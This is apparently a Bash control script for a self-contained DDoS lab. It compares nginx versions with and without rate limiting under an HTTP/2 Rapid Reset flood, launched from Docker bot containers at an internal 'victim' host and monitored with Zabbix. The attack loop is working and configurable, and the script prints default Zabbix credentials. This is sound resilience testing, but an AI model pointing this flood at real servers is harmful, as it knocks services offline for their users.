#!/usr/bin/env bash
set -uo pipefail

FLEET_CPUSET="${FLEET_CPUSET:-3-7}"
FLEET_CPUS="${FLEET_CPUS:-0.5}"
FLEET_IMAGE="lab-fleetbot:latest"

ROOT="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT"

C_G='\033[32m'; C_R='\033[31m'; C_Y='\033[33m'; C_B='\033[36m'; C_0='\033[0m'

ALL_EXPS=("exp1" "exp2" "exp3" "exp4")

dc_for() {
  local exp="$1"; shift
  docker compose --env-file "env/${exp}.env" -f docker-compose.experiment.yml "$@"
}
log() { echo -e "${C_B}[$(date +%H:%M:%S)]${C_0} $*"; }
get_env() { grep "$2" "env/${1}.env" | cut -d= -f2; }

fleet_names_for() { docker ps --filter "label=lab-exp=$1" --format '{{.Names}}' 2>/dev/null; }
fleet_count_for() { fleet_names_for "$1" | wc -l; }

_KILL='for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "1" ] && continue; [ "$p" = "$$" ] && continue; c=$(cat "$d/comm" 2>/dev/null); [ "$c" = "sleep" ] && continue; [ "$c" = "docker-init" ] && continue; kill -9 "$p" 2>/dev/null; done; exit 0'

do_attack_one() {
  local exp="$1" n="$2"
  local label; label=$(get_env "$exp" EXP_LABEL)
  local existing; existing=$(fleet_count_for "$exp")

  if [ "$n" -gt "$existing" ]; then
    log "[$label] Dodaje boty: $existing -> $n"
    for i in $(seq $((existing + 1)) "$n"); do
      docker run -d --name "${exp}-fbot-${i}" --label "lab-exp=$exp" --init \
        --network "${exp}_labnet" --cpuset-cpus "$FLEET_CPUSET" --cpus "$FLEET_CPUS" \
        "$FLEET_IMAGE" sleep infinity >/dev/null
    done
  elif [ "$n" -lt "$existing" ]; then
    log "[$label] Redukuje boty: $existing -> $n"
    for i in $(seq $((n + 1)) "$existing"); do
      docker rm -f "${exp}-fbot-${i}" >/dev/null 2>&1
    done
  fi

  local loop='while true; do rapidreset -url https://victim:443 -requests 20000 -concurrency 200 -quiet >/dev/null 2>&1; done'
  for cid in $(fleet_names_for "$exp"); do
    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1
    docker exec -d "$cid" sh -c "$loop"
  done
  log "${C_R}[$label] Atak: $(fleet_count_for "$exp") botow${C_0}"
}

do_stop_one() {
  local exp="$1"
  local label; label=$(get_env "$exp" EXP_LABEL)
  local names; names=$(fleet_names_for "$exp")
  [ -z "$names" ] && return
  for cid in $names; do docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1; done
  log "${C_G}[$label] Atak zatrzymany ($(fleet_count_for "$exp") botow zostaje)${C_0}"
}

do_remove_one() {
  local exp="$1"
  local names; names=$(fleet_names_for "$exp")
  [ -z "$names" ] && return
  echo "$names" | xargs docker rm -f >/dev/null 2>&1
}

do_up_one() {
  local exp="$1"
  local envfile="env/${exp}.env"
  [ ! -f "$envfile" ] && { log "${C_R}Nie ma pliku $envfile${C_0}"; return 1; }
  local label; label=$(get_env "$exp" EXP_LABEL)
  local port; port=$(get_env "$exp" ZABBIX_PORT)

  log "[$label] Stawiam stos (Zabbix :$port) ..."
  dc_for "$exp" up -d --build victim zabbix-db zabbix-server zabbix-web probe

  log "[$label] Czekam na victim..."
  local i=0
  while [ $i -lt 60 ]; do
    docker run --rm --network "${exp}_labnet" curlimages/curl:8.8.0 \
      -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && break
    i=$((i + 1)); sleep 2
  done
  log "[$label] victim gotowy."

  log "[$label] Czekam na Zabbix API..."
  local j=0
  while [ $j -lt 90 ]; do
    if curl -s -o /dev/null -w '%{http_code}' -X POST "http://localhost:${port}/api_jsonrpc.php" \
      -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' 2>/dev/null | grep -q 200; then
      log "[$label] Zabbix API gotowe."
      break
    fi
    j=$((j + 1)); sleep 2
  done

  log "[$label] Provisionuje Zabbix..."
  ZBX_URL="http://localhost:${port}/api_jsonrpc.php" python3 "$ROOT/../monitoring/provision.py" 2>&1 | tail -3
  log "${C_G}[$label] Gotowy. Zabbix :$port${C_0}"
}

do_down_one() {
  local exp="$1"
  local label; label=$(get_env "$exp" EXP_LABEL)
  do_remove_one "$exp"
  dc_for "$exp" down
  log "[$label] Stos zamkniety (dane Zabbix zachowane)."
}

do_reset_one() {
  local exp="$1"
  local label; label=$(get_env "$exp" EXP_LABEL)
  do_remove_one "$exp"
  dc_for "$exp" down -v
  log "[$label] Stos zamkniety + dane Zabbix skasowane."
}

running_exps() {
  local result=()
  for exp in "${ALL_EXPS[@]}"; do
    local cnt; cnt=$(docker ps --filter "label=com.docker.compose.project=$exp" -q 2>/dev/null | wc -l)
    [ "$cnt" -gt 0 ] && result+=("$exp")
  done
  echo "${result[@]}"
}

do_status() {
  echo ""
  local ip; ip=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
  for exp in "${ALL_EXPS[@]}"; do
    local label; label=$(get_env "$exp" EXP_LABEL)
    local port; port=$(get_env "$exp" ZABBIX_PORT)
    local cnt; cnt=$(docker ps --filter "label=com.docker.compose.project=$exp" -q 2>/dev/null | wc -l)
    local bots; bots=$(fleet_count_for "$exp")
    if [ "$cnt" -gt 0 ]; then
      echo -e "  ${C_G}$label${C_0} (:$port) — $cnt kontenerow, ${C_R}$bots botow${C_0}  http://$ip:$port"
    else
      echo -e "  $label (:$port) — wylaczony"
    fi
  done
  echo ""
}

show_help() {
  echo ""
  echo -e "  ${C_Y}Komendy:${C_0}"
  echo "    up <exp|all>       — odpal stos (exp1/exp2/exp3/exp4 lub all)"
  echo "    down <exp|all>     — zamknij stos (dane Zabbix zostaja)"
  echo "    reset <exp|all>   — zamknij stos + skasuj dane Zabbix"
  echo "    attack <N> [exp]   — N botow na aktywne stosy (lub podaj exp)"
  echo "    stop [exp|all]     — zatrzymaj atak"
  echo "    remove [exp|all]   — usun boty"
  echo "    status             — pokaz stan wszystkich"
  echo "    zabbix             — pokaz adresy Zabbixa"
  echo "    quit               — wyjdz"
  echo ""
  echo -e "  ${C_Y}Eksperymenty:${C_0}"
  echo "    exp1 = old-normal    (nginx 1.25.1, bez hardeningu)"
  echo "    exp2 = old-hardened  (nginx 1.25.1, rate-limit)"
  echo "    exp3 = new-normal    (nginx 1.27, bez hardeningu)"
  echo "    exp4 = new-hardened  (nginx 1.27, rate-limit)"
  echo ""
  echo -e "  ${C_Y}Przyklady:${C_0}"
  echo "    up all        — odpal wszystkie 4 stosy"
  echo "    attack 30     — 30 botow na kazdy aktywny stos"
  echo "    attack 50 exp1 — 50 botow tylko na exp1"
  echo "    stop all      — zatrzymaj atak na wszystkich"
  echo ""
}

# --- Build images ---
if ! docker image inspect "$FLEET_IMAGE" >/dev/null 2>&1; then
  log "Buduje obraz floty..."
  docker build -q -t "$FLEET_IMAGE" ../bot >/dev/null
fi
if ! docker image inspect lab-probe:latest >/dev/null 2>&1; then
  log "Buduje obraz sondy..."
  docker build -q -t lab-probe:latest ../probe >/dev/null
fi
mkdir -p results/old-normal results/old-hardened results/new-normal results/new-hardened

echo ""
echo -e "${C_G}=== DDoS Lab Cloud Control ===${C_0}"
show_help

while true; do
  echo -ne "${C_B}lab>${C_0} "
  read -r cmd arg1 arg2
  case "$cmd" in
    up)
      if [ "$arg1" = "all" ]; then
        for exp in "${ALL_EXPS[@]}"; do do_up_one "$exp"; done
      elif [ -n "$arg1" ]; then
        do_up_one "$arg1"
      else
        echo "Uzycie: up exp1|exp2|exp3|exp4|all"
      fi
      ;;
    down)
      if [ "${arg1:-all}" = "all" ]; then
        for exp in $(running_exps); do do_down_one "$exp"; done
      else
        do_down_one "$arg1"
      fi
      ;;
    reset)
      if [ "${arg1:-all}" = "all" ]; then
        for exp in $(running_exps); do do_reset_one "$exp"; done
      else
        do_reset_one "$arg1"
      fi
      ;;
    attack)
      [ -z "$arg1" ] && { echo "Uzycie: attack <N> [exp]"; continue; }
      if [ -n "$arg2" ]; then
        do_attack_one "$arg2" "$arg1"
      else
        local_running=($(running_exps))
        [ ${#local_running[@]} -eq 0 ] && { log "Brak aktywnych stosow. Najpierw: up all"; continue; }
        for exp in "${local_running[@]}"; do do_attack_one "$exp" "$arg1"; done
      fi
      ;;
    stop)
      if [ "${arg1:-all}" = "all" ]; then
        for exp in $(running_exps); do do_stop_one "$exp"; done
      elif [ -n "$arg1" ]; then
        do_stop_one "$arg1"
      fi
      ;;
    remove)
      if [ "${arg1:-all}" = "all" ]; then
        for exp in $(running_exps); do do_remove_one "$exp"; done
      elif [ -n "$arg1" ]; then
        do_remove_one "$arg1"
      fi
      ;;
    status)   do_status ;;
    zabbix)
      local_ip=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
      echo ""
      for exp in "${ALL_EXPS[@]}"; do
        local port; port=$(get_env "$exp" ZABBIX_PORT)
        local label; label=$(get_env "$exp" EXP_LABEL)
        echo "  $label: http://$local_ip:$port  (Admin / zabbix)"
      done
      echo ""
      ;;
    help|h)   show_help ;;
    quit|exit|q) echo "Bye."; break ;;
    "")       ;;
    *)        echo "Nieznana komenda: $cmd (wpisz help)" ;;
  esac
done
